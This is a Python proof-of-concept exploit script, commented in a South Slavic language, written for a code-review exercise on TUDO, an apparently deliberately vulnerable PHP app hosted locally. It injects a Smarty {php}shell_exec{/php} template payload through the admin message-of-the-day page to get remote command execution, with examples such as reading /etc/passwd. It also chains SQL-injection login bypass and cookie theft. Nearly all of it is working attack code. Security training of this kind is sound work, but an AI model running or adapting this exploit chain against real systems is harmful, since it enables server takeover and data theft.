#!/usr/bin/env python3
"""
TUDO (bmdyy/tudo) - Remote Code Execution Exploit
===================================================
Zadatak: Security Code Review and Analysis
Target:  http://localhost:8000

Statickom analizom koda uocavamo da admin stranica `admin/update_motd.php`
dozvoljava administratoru da upisuje proizvoljan sadrzaj u fajl `templates/motd.tpl`:

    $t_file = fopen("../templates/motd.tpl","w");
    fwrite($t_file, $message);
    fclose($t_file);

Ovaj template se zatim renderuje na `index.php` koriscenjem Smarty template engine-a:

    $smarty = new Smarty();
    $smarty->assign("username", $_SESSION['username']);
    $smarty->force_compile = true;
    echo $smarty->fetch("motd.tpl");

Smarty podrZava izvrsavanje PHP koda kroz svoje tagove. Konkretno, tag
`{php}echo shell_exec('cmd');{/php}` izvrsava sistemsku komandu i ispisuje rezultat.
Posto ne postoji nikakva sanitizacija unesenog sadrzaja prije pisanja u
template fajl, napadac koji ima admin sesiju moze injektovati Smarty
payload koji ce biti izvrsn pri svakom ucitavanju index.php.

Pretpostavke:
    - Imamo admin PHPSESSID cookie (dobijen kroz priv_exc.py)

Upotreba:
    python3 rce.py --session <PHPSESSID>
    python3 rce.py --session <PHPSESSID> --cmd "id"
    python3 rce.py --session <PHPSESSID> --cmd "cat /etc/passwd"
    python3 rce.py --cmd "id"   # pokrece kompletan chain (login bypass + XSS + RCE)
"""

import argparse
import re
import sys

try:
    import requests
except ImportError:
    print("[!] Instaliraj requests: pip install requests")
    sys.exit(1)

from login_bypass import method_sqli, session_after_login
from priv_exc import steal_cookie

TARGET      = "http://localhost:8000"
VICTIM      = "user1"
VICTIM_PASS = "pwned123"  # lozinka koju method_sqli upisuje via SQLi


def rce_ssti(base: str, phpsessid: str, command: str) -> str:
    """
    Ranjivi kod (admin/update_motd.php):

        $t_file = fopen("../templates/motd.tpl","w");
        fwrite($t_file, $message);

    Smarty tag {php}...{/php} se izvrsava kada index.php renderuje motd.tpl:

        echo $smarty->fetch("motd.tpl");

    Upisemo payload kao admin, pa posjetimo index.php da ga trigerujemo.
    """
    print(f"\n[*] Korak 3: RCE putem Smarty SSTI (update_motd.php)...")

    ssti_payload = "{php}echo shell_exec('" + command + "');{/php}"
    print(f"    Smarty payload: {ssti_payload}")
    print(f"    Objasnjenje: Smarty 2.x podrZava {{php}} tag koji izvrsava PHP direktno.")

    admin_session = requests.Session()
    admin_session.cookies.set('PHPSESSID', phpsessid)

    r = admin_session.post(f"{base}/admin/update_motd.php",
                           data={"message": ssti_payload},
                           allow_redirects=False)

    if r.status_code not in (200, 302):
        print(f"    [-] Pisanje u motd.tpl nije uspjelo (HTTP {r.status_code})")
        sys.exit(1)

    print(f"    [+] Payload upisan u motd.tpl")
    print(f"    [+] Pozivamo index.php da triggerujemo izvrsavanje...")

    r = admin_session.get(f"{base}/index.php")

    clean = re.sub(r'<[^>]+>', '\n', r.text)
    clean = re.sub(r'\n{2,}', '\n', clean).strip()

    output = ""
    for line in clean.splitlines():
        line = line.strip()
        if not line:
            continue
        if "uid=" in line and "gid=" in line:
            output = line
            break
        if command.strip() == "whoami" and line in ("root", "www-data", "apache"):
            output = line
            break

    if not output:
        if "[MoTD]" in clean:
            idx = clean.index("[MoTD]")
            after = clean[idx + len("[MoTD]"):idx + 500]
            lines = [l.strip() for l in after.splitlines() if l.strip()]
            output = "\n".join(lines[:5]) if lines else ""
        if not output:
            output = clean[:500]

    return output


def main():
    parser = argparse.ArgumentParser(
        description="TUDO RCE PoC - Smarty SSTI via update_motd.php",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Primjeri:
  python3 rce.py --session <PHPSESSID>
  python3 rce.py --session <PHPSESSID> --cmd "id"
  python3 rce.py --session <PHPSESSID> --cmd "cat /etc/passwd"
        """
    )
    parser.add_argument("--target",  default=TARGET,
                        help=f"Base URL aplikacije (default: {TARGET})")
    parser.add_argument("--cmd",     default="id",
                        help="Komanda za izvrsavanje (default: id)")
    parser.add_argument("--session", default=None,
                        help="Admin PHPSESSID cookie (preskoci login bypass + XSS)")
    args = parser.parse_args()

    print("=" * 55)
    print("  TUDO - Remote Code Execution PoC")
    print("  github.com/bmdyy/tudo")
    print("=" * 55)
    print(f"\n[*] Target:  {args.target}")
    print(f"[*] Komanda: {args.cmd}")

    if args.session:
        phpsessid = args.session
    else:
        method_sqli(args.target)
        user_session = session_after_login(args.target, VICTIM, VICTIM_PASS)
        if not user_session:
            print("[-] Login nije uspio.")
            sys.exit(1)
        phpsessid = steal_cookie()

    output = rce_ssti(args.target, phpsessid, args.cmd)

    print("\n" + "=" * 55)
    print("  IZLAZ KOMANDE")
    print("=" * 55)
    print(output if output else "(prazan izlaz - provjeri da li je admin sesija validna)")
    print("=" * 55)

    if output:
        print("\n[+] RCE USPJESAN!")
    else:
        print("\n[-] RCE nije uspio.")
        print("    Provjeri da li je admin PHPSESSID validan i da li je aplikacija pokrenuta.")


if __name__ == "__main__":
    main()
